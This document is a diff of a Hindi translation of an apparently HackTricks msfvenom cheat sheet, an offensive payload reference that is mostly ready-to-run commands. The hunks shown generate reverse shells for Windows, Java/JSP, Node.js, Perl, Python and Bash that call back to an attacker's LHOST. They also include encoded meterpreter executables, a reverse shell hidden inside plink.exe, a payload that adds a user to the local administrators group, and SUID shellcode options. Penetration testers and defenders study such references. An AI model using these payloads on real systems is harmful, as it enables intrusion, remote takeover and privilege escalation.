@@ -1,21 +1,21 @@
 # MSFVenom - CheatSheet
 
-{{#include ../../banners/hacktricks-training.md}}
-
 ---
 
-## बुनियादी msfvenom
+## Basic msfvenom
 
 `msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`
 
-Architecture निर्दिष्ट करने के लिए `-a` या `--platform` का भी उपयोग किया जा सकता है।
+`-a` का उपयोग payload architecture चुनने के लिए और `--platform` का उपयोग उसके target platform को चुनने के लिए करें।<sup>[[1]](#references)</sup>
 
-## सूचीકરણ
+## Listing
 ```bash
 msfvenom -l payloads #Payloads
 msfvenom -l encoders #Encoders
 ```
-## Shellcode बनाते समय सामान्य parameters
+ये commands installed framework में उपलब्ध payload और encoder modules की सूची दिखाते हैं।<sup>[[1]](#references)</sup>
+
+## shellcode बनाते समय सामान्य params
 ```bash
 -b "\x00\x0a\x0d"
 -f c
@@ -23,6 +23,8 @@ msfvenom -l encoders #Encoders
 EXITFUNC=thread
 PrependSetuid=True #Use this to create a shellcode that will execute something with SUID
 ```
+यहाँ दिखाए गए flags bad characters, output format, encoder और encoding iterations चुनते हैं।<sup>[[1]](#references)</sup>
+
 ## **Windows**
 
 ### **Reverse Shell**
@@ -50,7 +52,7 @@ msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administr
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
 ```
-### Executable के अंदर Embedded
+### executable के अंदर embedded
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe
 ```
@@ -111,7 +113,7 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f w
 ```bash
 msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
 ```
-## **Script Language payloads**
+## **Script भाषा payloads**
 
 ### **Perl**
 ```bash
@@ -125,4 +127,7 @@ msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw 
 ```bash
 msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh
 ```
+## References
+
+- [1] [msfvenom का उपयोग कैसे करें](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom/eb69bce6cf0d2ba0e876c57b87793bf31c915bb7)
 {{#include ../../banners/hacktricks-training.md}}
